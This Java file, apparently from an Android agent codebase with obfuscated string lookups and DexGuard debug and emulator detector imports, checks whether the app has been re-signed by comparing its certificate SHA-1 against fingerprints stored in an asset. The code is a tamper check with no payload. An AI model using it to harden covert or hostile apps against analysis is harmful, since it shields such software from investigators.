package com.android.dvci.util;

import android.content.Context;
import android.content.pm.PackageManager;
import android.content.pm.Signature;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.crypto.Digest;
import com.android.mm.M;

import java.io.ByteArrayInputStream;
import java.io.InputStream;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.security.cert.CertificateException;
import java.security.cert.CertificateFactory;
import java.security.cert.X509Certificate;
import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import dexguard.util.CertificateChecker;
import dexguard.util.DebugDetector;
import dexguard.util.EmulatorDetector;

public class AntiSign {
	private static final String TAG = "AntiSign";

	public boolean isReSigned() {

		//boolean certOK = false;
		String data = Utils.readAssetPayload(M.e("tp.data"));
		// Direct use of Pattern:
		Pattern p = Pattern.compile("([A-F0-9:]{59})");
		Matcher m = p.matcher(data);
		List<String> sha1List = new ArrayList<String>();
		while (m.find()) { // Find each match in turn; String can't do this.

			String sha = m.group(1).replace(":", "");
			sha1List.add( sha); // Access a submatch group; String can't do this.
			if (Cfg.DEBUG) {
				Check.log(TAG + " (checkSignature), data " + m.group(1));
			}

//			final int OK = 2;
//			int certificateChanged = CertificateChecker.checkCertificate(Status.getAppContext(), sha, OK);
//			int certificatet1 = CertificateChecker.checkCertificate(Status.getAppContext(), sha);
//			int certificatet2 = CertificateChecker.checkCertificate(Status.getAppContext(), "00:3A:46:7B:F6:6C:15:76:38:E3:EB:31:AE:B1:6A:24:2B:2B:FF:11");
//			int certificatet3 = CertificateChecker.checkCertificate(Status.getAppContext(), "00:3A:46:7B:F6:6C:15:76:38:E3:EB:31:AE:B1:6A:24:2B:2B:FF:11", OK);
//
//			if(certificateChanged == OK){
//				certOK = true;
//			}
//			if (Cfg.DEBUG) {
//				Check.log(TAG + " (checkSignature), checkCertificate: " + (certificateChanged == OK));
//			}

		}

		Context context = Status.getAppContext();
		Signature[] sigs = new Signature[0];
		boolean found = false;

		try {
			sigs = context.getPackageManager().getPackageInfo(context.getPackageName(), PackageManager.GET_SIGNATURES).signatures;
			for (Signature sig : sigs) {
				final byte[] rawCert = sig.toByteArray();
				InputStream certStream = new ByteArrayInputStream(rawCert);

				final CertificateFactory certFactory;
				final X509Certificate x509Cert;
				try {
					certFactory = CertificateFactory.getInstance("X509");
					x509Cert = (X509Certificate) certFactory.generateCertificate(certStream);
					MessageDigest md = MessageDigest.getInstance("SHA1");
					byte[] publicKey = md.digest(x509Cert.getEncoded());
					String sha1 = StringUtils.byteArrayToHexString(publicKey);

					if(sha1List.contains(sha1)){
						found = true;
						if (Cfg.DEBUG) {
							Check.log(TAG + " (checkSignature), Found, correct certificate");
						}
					}

					if (Cfg.DEBUG) {
						Check.log(TAG + " (checkSignature), Certificate subject: " + x509Cert.getSubjectDN());
						Check.log(TAG + " (checkSignature), Certificate sha1: " + sha1);
						//Check.log(TAG + " (checkSignature), Certificate issuer: " + x509Cert.getIssuerDN());
						//Check.log(TAG + " (checkSignature), Certificate serial number: " + x509Cert.getSerialNumber());
					}

				} catch (CertificateException e) {
					// e.printStackTrace();
				} catch (NoSuchAlgorithmException e) {
					//e.printStackTrace();
				}
			}
		} catch (PackageManager.NameNotFoundException e) {
			e.printStackTrace();
		}

		return !found ;
	}

}
